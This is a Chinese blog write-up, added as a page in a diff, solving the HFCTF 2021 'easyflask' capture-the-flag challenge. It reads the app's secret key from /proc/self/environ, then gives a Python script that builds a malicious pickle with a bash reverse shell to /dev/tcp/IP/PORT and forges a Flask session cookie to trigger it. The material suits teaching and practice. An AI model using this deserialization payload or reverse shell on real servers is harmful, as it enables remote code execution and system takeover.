@@ -1,0 +1,267 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>HFCTF:2021-easyflask - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="
+/app/source里的源码
+#!/usr/bin/python3.6
+import os
+import pickle
+
+from base64 import b64decode
+from fl,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="/atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">HFCTF:2021-easyflask</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">HFCTF:2021-easyflask</h1>
+        <div class="stuff">
+            <span>八月 01, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p><img src="/2021/08/01/hfctf-2021-easyflask/image-20210802215741280.png" alt="image-20210802215741280"></p>
+<p>/app/source里的源码</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3.6</span>
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> pickle
+
+<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> session
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"SECRET_KEY"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"*******"</span>
+
+User <span class="token operator">=</span> type<span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>object<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+    <span class="token string">'uname'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span>
+    <span class="token string">'is_admin'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
+    <span class="token string">'__repr__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> o<span class="token punctuation">.</span>uname<span class="token punctuation">,</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token operator">not</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        session<span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span> <span class="token operator">=</span> u
+    <span class="token keyword">return</span> <span class="token string">"/file?file=index.js"</span>
+
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/file'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">file_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    path <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>
+    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">or</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span> \
+            <span class="token operator">or</span> <span class="token string">'.py'</span> <span class="token keyword">in</span> path <span class="token operator">or</span> <span class="token string">'.sh'</span> <span class="token keyword">in</span> path <span class="token operator">or</span> <span class="token string">'..'</span> <span class="token keyword">in</span> path <span class="token operator">or</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'disallowed'</span>
+
+    <span class="token keyword">with</span> open<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>
+        content <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> content
+
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">admin_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        u <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>u<span class="token punctuation">,</span> dict<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            u <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>u<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>u<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'uhh?'</span>
+
+    <span class="token keyword">if</span> u<span class="token punctuation">.</span>is_admin <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'welcome, admin'</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'who are you?'</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre>
+<p>/proc/self/environ</p>
+<pre><code>HOSTNAME=99d252572f0c
+PYTHON_VERSION=3.8.2
+PWD=/app
+_=/usr/local/bin/python3
+HOME=/root
+LANG=C.UTF-8
+GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568
+FLAG=flag_not_here
+SHLVL=1
+PYTHON_PIP_VERSION=20.0.2
+PYTHON_GET_PIP_SHA256=421ac1d44c0cf9730a088e337867d974b91bdce4ea2636099275071878cc189e
+PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d59197a3c169cef378a22428a3fa99d33e080a5d/get-pip.py
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh
+OLDPWD=/app</code></pre>
+<p>可以看到secret_key值为<code>glzjin22948575858jfjfjufirijidjitg3uiiuuh</code>。知道secret_key之后就可以污染session，然后pickle反序列化RCE。这里的反序列化和普通的反序列化一样，并没有在opcode上进行过滤，所以解决办法也就是使用<code>__reduce__</code>进行RCE。</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle
+<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode
+<span class="token keyword">import</span> os
+
+User <span class="token operator">=</span> type<span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>object<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+    <span class="token string">'uname'</span><span class="token punctuation">:</span> <span class="token string">'tyskill'</span><span class="token punctuation">,</span>
+    <span class="token string">'is_admin'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
+    <span class="token string">'__repr__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> o<span class="token punctuation">.</span>uname<span class="token punctuation">,</span>
+    <span class="token comment" spellcheck="true"># 添加__reduce__方法RCE</span>
+    <span class="token string">'__reduce__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/IP/PORT 0>&amp;1'"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>生成之后使用<strong>flask_session_cookie_manager</strong>按照格式<code>{'u':{'b':'base64字符串'}}</code>生成session替换原session访问<code>/admin</code>就可以反弹shell。</p>
+<p>session。.eJwtxksOgjAUAMCrmJ4AJJBAwqIQS_gZtUpLdzwSH5ha2Agi4e66cFazkhcJVrIDEhCkvKqQ_sVlnGR2I95WI9yPTueDkqqDjF9_96TtjyCjqTWXu1zQgFOanLszOJGGHo0SxwGWCOs9s9LYf0LCTJpQPPV0Ug_WqaUdC5PpWpyHXHGmWX4rMAzJtn0BiBswYw.YI07Bg.NkAe66dAOnYTZHn9l0D-Wsetbts复制到题目中，访问/admin，报500错误，初步判断成功了。然后访问<code>/file?file=/f1ag</code>得到flag</p>
+<p>注：</p>
+<p>靶机是Linux环境，本地是Windows环境，这两个环境下dumps的结果中序列化字符串声明系统的标识符不同：Linux=&gt;posix；Windows=&gt;nt，需要将脚本放在Linux环境下生成序列化字符串</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+				
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
